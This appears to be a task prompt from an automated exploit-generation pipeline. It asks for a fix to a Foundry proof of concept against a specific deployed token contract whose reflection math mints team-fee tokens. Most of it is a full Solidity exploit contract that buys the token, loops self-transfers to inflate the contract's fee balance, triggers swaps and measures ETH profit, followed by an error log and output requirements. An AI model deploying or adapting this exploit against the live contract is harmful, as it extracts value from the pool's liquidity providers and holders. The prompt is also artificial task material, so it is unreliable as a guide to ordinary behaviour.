You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Broken reflection math mints team-fee tokens out of thin air
- claim: The reflection calculation subtracts only the reflected tax fee from the recipient amount. `_getTValues()` removes both `tFee` and `tteam` from the transfer amount, but `_getRValues()` receives only `tFee` and computes `rTransferAmount = rAmount - rFee`, while `_taketeam()` still credits the contract with `tteam`. This makes each taxed transfer credit the recipient as if no team fee were removed while also crediting the contract with the team fee.
- impact: The token supply invariant is broken and team-fee transfers inflate balances. Those extra tokens accumulate in the contract and can later be swapped for ETH and forwarded to the fee wallets, extracting value from AMM liquidity. The issue is especially dangerous on self-transfers when `_teamFee > 0` and `_taxFee == 0`, because the sender's net balance does not decrease by the team fee while the contract still gains fee tokens.
- exploit_paths: ["Owner enables `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.", "Any non-excluded account performs transfers; on a self-transfer the sender only loses the reflected tax fee, not the team fee.", "`_taketeam()` credits the contract with newly created reflected value.", "Later transfers trigger `swapTokensForEth()` and `sendETHToteam()`, converting the inflated tokens into ETH taken from the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITomInu is IERC20Like {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingEnabled() external view returns (bool);
    function cooldownEnabled() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function _teamWalletAddress() external view returns (address payable);
    function _marketingWalletAddress() external view returns (address payable);
}

contract Sink {
    receive() external payable {}
}

contract FlawVerifier {
    address public constant TARGET = 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F;
    uint256 internal constant SWAP_THRESHOLD = 5_000_000_000_000_000;
    uint256 internal constant STATUS_IDLE = 0;
    uint256 internal constant STATUS_NO_CAPITAL = 1;
    uint256 internal constant STATUS_TRADING_DISABLED = 2;
    uint256 internal constant STATUS_BUY_FAILED = 3;
    uint256 internal constant STATUS_COOLDOWN_BLOCKS_STAGE2 = 4;
    uint256 internal constant STATUS_NO_TEAM_MINT_OBSERVED = 5;
    uint256 internal constant STATUS_VALIDATED_NO_PROFIT = 6;
    uint256 internal constant STATUS_PROFIT = 7;

    address public immutable sink;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public lastStatus;
    uint256 public observedMintToContract;
    uint256 public observedAttackerBalanceLoss;
    uint256 public observedFeeWalletEthIncrease;
    uint256 public startingEthBalance;
    uint256 public endingEthBalance;

    uint256 private _profitAmount;

    constructor() {
        sink = address(new Sink());
    }

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        ITomInu token = ITomInu(TARGET);
        IUniswapV2Router02Like router = IUniswapV2Router02Like(token.uniswapV2Router());

        startingEthBalance = address(this).balance;
        endingEthBalance = address(this).balance;
        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        observedMintToContract = 0;
        observedAttackerBalanceLoss = 0;
        observedFeeWalletEthIncrease = 0;
        lastStatus = STATUS_IDLE;

        uint256 initialTokenBalance = token.balanceOf(address(this));
        bool boughtThisCall;

        if (initialTokenBalance == 0) {
            if (address(this).balance == 0) {
                lastStatus = STATUS_NO_CAPITAL;
                return;
            }
            if (!token.tradingEnabled()) {
                lastStatus = STATUS_TRADING_DISABLED;
                return;
            }

            address[] memory buyPath = new address[](2);
            buyPath[0] = router.WETH();
            buyPath[1] = TARGET;

            try router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
                0,
                buyPath,
                address(this),
                block.timestamp
            ) {
                boughtThisCall = true;
            } catch {
                lastStatus = STATUS_BUY_FAILED;
                return;
            }

            initialTokenBalance = token.balanceOf(address(this));
            if (initialTokenBalance == 0) {
                lastStatus = STATUS_BUY_FAILED;
                return;
            }

            if (token.cooldownEnabled()) {
                // Stage 1 in the hypothesis is owner-only (_setteamFee) and cannot be induced here.
                // This verifier therefore only exercises stages 2-4 when the fork already has the
                // vulnerable fee configuration live. If executeOnOpportunity() must first buy TINU,
                // stage 2 is mechanically blocked while cooldown is enabled because pair->recipient
                // buys write timestamp[recipient] = now + 15s and the follow-up self-transfer reverts.
                lastStatus = STATUS_COOLDOWN_BLOCKS_STAGE2;
                endingEthBalance = address(this).balance;
                return;
            }
        }

        uint256 maxTxAmount = token._maxTxAmount();
        uint256 teamWalletEthBefore = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;

        bool minted;
        for (uint256 i = 0; i < 24; ++i) {
            uint256 attackerBefore = token.balanceOf(address(this));
            if (attackerBefore <= 1) {
                break;
            }

            uint256 amount = attackerBefore - 1;
            if (amount > maxTxAmount) {
                amount = maxTxAmount;
            }
            if (amount == 0) {
                break;
            }

            uint256 contractBefore = token.balanceOf(TARGET);
            bool ok;
            try token.transfer(address(this), amount) returns (bool success) {
                ok = success;
            } catch {
                break;
            }
            if (!ok) {
                break;
            }

            uint256 contractAfter = token.balanceOf(TARGET);
            uint256 attackerAfter = token.balanceOf(address(this));

            if (contractAfter > contractBefore) {
                minted = true;
                observedMintToContract += contractAfter - contractBefore;
            }
            if (attackerBefore > attackerAfter) {
                observedAttackerBalanceLoss += attackerBefore - attackerAfter;
            }
            if (contractAfter >= SWAP_THRESHOLD) {
                break;
            }
        }

        if (!minted) {
            lastStatus = STATUS_NO_TEAM_MINT_OBSERVED;
            _unwindBoughtInventory(token, router, boughtThisCall);
            _finalizeProfit();
            return;
        }

        hypothesisValidated = true;

        uint256 contractTokenBalance = token.balanceOf(TARGET);
        if (token.swapEnabled() && contractTokenBalance >= SWAP_THRESHOLD) {
            try token.transfer(sink, 1) returns (bool triggerSuccess) {
                triggerSuccess;
            } catch {}
        }

        uint256 teamWalletEthAfter = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;
        if (teamWalletEthAfter > teamWalletEthBefore) {
            observedFeeWalletEthIncrease = teamWalletEthAfter - teamWalletEthBefore;
        }

        // Stage 4 extracts ETH to the fee wallets, not to the caller. Without pre-existing attacker
        // control over those wallets on the fork, the bug can be mechanically validated but the ETH
        // proceeds do not accrue to this verifier.
        _unwindBoughtInventory(token, router, boughtThisCall);
        _finalizeProfit();
        lastStatus = _profitAmount > 0 ? STATUS_PROFIT : STATUS_VALIDATED_NO_PROFIT;
    }

    function _unwindBoughtInventory(ITomInu token, IUniswapV2Router02Like router, bool boughtThisCall) internal {
        if (!boughtThisCall) {
            return;
        }

        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        try token.approve(address(router), type(uint256).max) returns (bool approveSuccess) {
            approveSuccess;
        } catch {
            return;
        }

        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _finalizeProfit() internal {
        endingEthBalance = address(this).balance;
        if (endingEthBalance > startingEthBalance) {
            _profitAmount = endingEthBalance - startingEthBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0, 2, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
